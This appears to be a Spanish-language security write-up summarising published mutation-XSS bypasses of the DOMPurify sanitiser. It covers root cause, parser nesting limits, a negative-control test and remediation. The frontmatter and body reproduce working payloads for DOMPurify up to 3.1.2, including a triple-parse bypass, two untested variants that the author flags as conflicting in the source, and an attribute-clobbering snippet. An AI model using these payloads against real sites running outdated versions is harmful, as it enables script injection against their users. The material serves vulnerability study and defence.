---
clase: xss
tech: dompurify
cwe: CWE-79
cvss: 8.1 # [derivado] XSS tras sanitizacion; sin CVE en la fuente
payload: |
  # ---- BYPASS DE TRIPLE PARSEO, DOMPurify <= 3.1.2 (Fig. 54) ----
  # LITERAL de la fuente. El enlace de PoC en vivo carga purify.min.js 3.1.2.
  var n = 510;
  var payload = `
  ${"<form><h1></form><table><form></form></table></form></table></h1></form>".repeat(n)}
  <math>
      <mi>
          <style><!--</style>
          <style id="--></style></mi></math><img src='x' onerror='alert(1)'>"></style>
      </mi>
  </math>
  `;
  document.body.innerHTML = DOMPurify.sanitize(payload)
  document.body.innerHTML = document.body.innerHTML;
  #
  # Nota de la fuente sobre este: 'This time it works on Firefox!'
  #
  # ---- VARIANTE DOMPurify <= 3.1.0 (Fig. 55) ----
  # ADVERTENCIA CRITICA DE PROCEDENCIA: el bloque de codigo del articulo y su propio
  # enlace de PoC en vivo NO COINCIDEN. El bloque usa un envoltorio extra
  # <desc><svg> y la etiqueta <title>; el enlace usa <style> en ese lugar y no tiene
  # el envoltorio. Ninguna de las dos versiones se ha probado. Reproduzco AMBAS.
  #
  # Version del BLOQUE DE CODIGO:
  var n = 503;
  var dirty = `
  ${"<form><h1></form><table><form></form></table></form></table></h1></form>\n".repeat(n)}
  <a>
      <svg>
          <desc>
              <svg>
                  <image>
                      <a>
                          <desc>
                              <svg>
                                  <image></image>
                              </svg>
                          </desc>
                      </a>
                  </image>
                  <title><a id="</title><img src=x onerror=alert(1)>"></a></title>
              </svg>
          </desc>
      </svg>
  </a>
  `;
  var step1 = DOMPurify.sanitize(dirty);
  document.body.innerHTML = DOMPurify.sanitize(step1);
  #
  # Version del ENLACE DE POC EN VIVO (decodificada del fragmento de la URL):
  <a>
    <svg>
      <image>
        <a>
          <desc>
            <svg>
              <image></image>
            </svg>
          </desc>
        </a>
      </image>
      <style><a id="</style><img src=x onerror=alert(1)>"></a></style>
    </svg>
  </a>
  #
  # El '\n' dentro de repeat() es una barra invertida y una 'n' literales en la fuente.
  #
  # ---- CLOBBERING DE __depth, segundo orden (habilita el bypass de 3.1.2) ----
  # LITERAL de la fuente:
  <form id="x "></form>
  <input form="x" name="__depth">
  <script>
  f = document.getElementById("x ");
  f.setAttribute("id", f.id.trim());
  depth = f.__depth + 1; // [object HTMLInputElement]1

  if (depth >= 255) {
      // This never gets reached.
  }
  </script>
precondicion: "La aplicacion sanea con DOMPurify y DESPUES vuelve a parsear la salida (asignandola a innerHTML). El bypass de triple parseo necesita exactamente eso: la mutacion 'occurs only in a two-parsing window' segun la fuente, asi que se dispara en el TERCER parseo, cuando DOMPurify ya termino. Versiones afectadas segun la fuente: <=3.1.0, <=3.1.1 y <=3.1.2 segun la variante."
como_se_descubre: |
  La clave estructural, y lo que hace a esta familia posible: el aplanado de nodos del
  navegador ocurre DESPUES del parseo. DOMPurify ve y limpia un arbol; al
  reserializarlo y volver a parsearlo, el navegador produce OTRO arbol distinto.
  Tabla de limites de anidamiento que da la fuente, util para saber donde aplica:
  #   DOMParser (Chromium, Firefox, Safari): 512 -> APLANA
  #   Ruby nokogiri: 256 -> elimina
  #   libxml2 (C), php-xml (PHP), lxml (Python): 255 -> elimina
  #   html.parser, parse5, htmlparser2, x/net/html, html5ever, Jsoup, HTML::TreeBuilder: sin limite
  Los numeros de los payloads (n=510, n=503) estan calibrados contra el limite de 512
  del navegador: no son arbitrarios.
  Punto de integracion: la fuente lista los puntos de integracion MathML (mi, mo, mn,
  ms, mtext) y HTML (annotation-xml, foreignObject, desc, title). Son las costuras
  entre espacios de nombres, que es donde vive la mXSS.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: el payload con DOS pasadas de parseo -> ejecuta
  # B: el MISMO payload con UNA sola pasada (solo DOMPurify.sanitize, sin reasignar
  #    innerHTML) -> NO ejecuta
  # El par A/B es el nucleo del hallazgo y tambien el diagnostico que la aplicacion
  # necesita: demuestra que el fallo esta en el RE-PARSEO, no en DOMPurify. Una
  # aplicacion que sanea una vez y escribe con textContent no es vulnerable.
  # C: probar en Chromium Y en Firefox. La fuente documenta que las variantes difieren
  #    por motor y que el autor NO sabe por que: 'I have no idea where this parsing
  #    difference comes from.'
mata: |
  - DOMPurify 3.1.3 o posterior (corrige el triple parseo), 3.1.2 (corrige el
    clobbering de parentNode) o 3.1.1 (corrige el primero), segun la variante.
  - La aplicacion sanea UNA vez y no vuelve a parsear la salida -> B no ejecuta.
  - Firefox no es vulnerable a las variantes A, B y C segun la fuente; si lo es a la
    de triple parseo.
  - Escribir con textContent en lugar de innerHTML: no hay parseo de HTML en absoluto.
fuente: "https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes (Mizu, 2024-11-17; el articulo no tiene firma, el pie dice 'Mizu's website'). Votada tecnica nº5 de 2024 en el Top 10 de PortSwigger. Variante de 3.1.0 atribuida por la fuente a @IcesFont; la de triple parseo hallada con @hash_kitten y @ryotkak. Sin CVE ni recompensa en la fuente. ADVERTENCIA: los payloads de las Fig. 25, 29 y 47 son SOLO IMAGENES y no se reconstruyen. El articulo es la parte 1 de 2."
confianza: media
fecha: 2026-11-02
---
# [XSS] mXSS en DOMPurify — sanear dos veces es lo que lo rompe

## Principio
El aplanado de nodos del navegador ocurre **después** del parseo. DOMPurify ve un árbol y
lo limpia correctamente. Al reserializar ese árbol y volver a parsearlo, el navegador
produce **otro árbol distinto** — y en ese otro árbol el payload vuelve a estar vivo.

La consecuencia es contraintuitiva y es el valor del trabajo: **una aplicación que sanea
dos veces "por si acaso" es más vulnerable que una que sanea una vez**. La fuente señala
que algunas lo hacen exactamente por eso, y que la mutación *"occurs only in a
two-parsing window"*.

## Payload
Triple parseo contra DOMPurify ≤ 3.1.2:

```javascript
var n = 510;
var payload = `
${"<form><h1></form><table><form></form></table></form></table></h1></form>".repeat(n)}
<math>
    <mi>
        <style><!--</style>
        <style id="--></style></mi></math><img src='x' onerror='alert(1)'>"></style>
    </mi>
</math>
`;
document.body.innerHTML = DOMPurify.sanitize(payload)
document.body.innerHTML = document.body.innerHTML;
```

Nota de la fuente sobre este: *"This time it works on Firefox!"*

## Advertencia crítica de procedencia
Para la variante de 3.1.0, **el bloque de código del artículo y su propio enlace de PoC en
vivo no coinciden**. El bloque usa un envoltorio extra `<desc><svg>` y la etiqueta
`<title>`; el enlace usa `<style>` en ese lugar y no tiene el envoltorio.

Reproduzco ambas versiones en el frontmatter de este writeup, sin elegir. Ninguna se ha
probado aquí, y la discrepancia está en la fuente — no es un artefacto de la conversión.
De ahí `confianza: media`.

Los payloads de las Fig. 25, 29 y 47 existen **solo como imágenes** y no los reconstruyo.

## Por qué `n = 510` y `n = 503`
No son números arbitrarios: están calibrados contra el límite de anidamiento del
navegador. La tabla de la fuente:

| Parser | Límite | Comportamiento |
|---|---|---|
| DOMParser (Chromium, Firefox, Safari) | 512 | **aplana** |
| Ruby nokogiri | 256 | elimina |
| libxml2, php-xml, lxml | 255 | elimina |
| html.parser, parse5, htmlparser2, x/net/html, html5ever, Jsoup | sin límite | — |

Que el navegador **aplane** en lugar de eliminar es la precondición de toda la familia: el
nodo profundo no desaparece, se mueve a un sitio donde significa otra cosa.

## El clobbering de `__depth` en segundo orden
La corrección de 3.1.0 introdujo un contador de profundidad. El bypass de 3.1.2 lo anula
aprovechando que `_sanitizeAttributes` **recorta los valores de atributo después** de la
comprobación de clobbering:

```javascript
<form id="x "></form>
<input form="x" name="__depth">
<script>
f = document.getElementById("x ");
f.setAttribute("id", f.id.trim());
depth = f.__depth + 1; // [object HTMLInputElement]1

if (depth >= 255) {
    // This never gets reached.
}
</script>
```

Un espacio al final de un `id`, que pasa la comprobación y se recorta después. El orden de
las operaciones vuelve a ser el fallo, igual que en el writeup de Punycode/Joomla.

## El control negativo es también el diagnóstico
Probar el mismo payload con **una sola** pasada de parseo. Si no ejecuta, queda demostrado
que el fallo está en el re-parseo y no en DOMPurify — que es exactamente lo que el equipo
de la aplicación necesita saber para corregirlo. La solución no es actualizar la librería:
es dejar de reparsear la salida.

Y hay que probar en los dos motores. La fuente documenta que las variantes difieren por
navegador y es honesta sobre su límite: *"I have no idea where this parsing difference
comes from."*

## Impacto
XSS tras pasar por un sanitizador considerado el estándar del sector. Afecta a cualquier
aplicación que sanee y reparse, y la fuente menciona que funciona *"perfectly on outdated
mermaid.js versions"*.

## Remediación
Actualizar: **3.1.1** corrige la primera variante, **3.1.2** la del clobbering de
`parentNode`, **3.1.3** la del triple parseo. Con la advertencia que la propia fuente
añade sobre el último arreglo: *"the library's security now relies heavily on a single
regular expression"*.

`# [derivado]`, y es la corrección que no depende de versiones: **sanear una sola vez y no
volver a parsear la salida**. Si el contenido no necesita ser HTML, escribirlo con
`textContent`, que no parsea nada.

La valoración de la propia fuente conviene recogerla: *"DOMPurify is an amazing library;
keep using it!"*
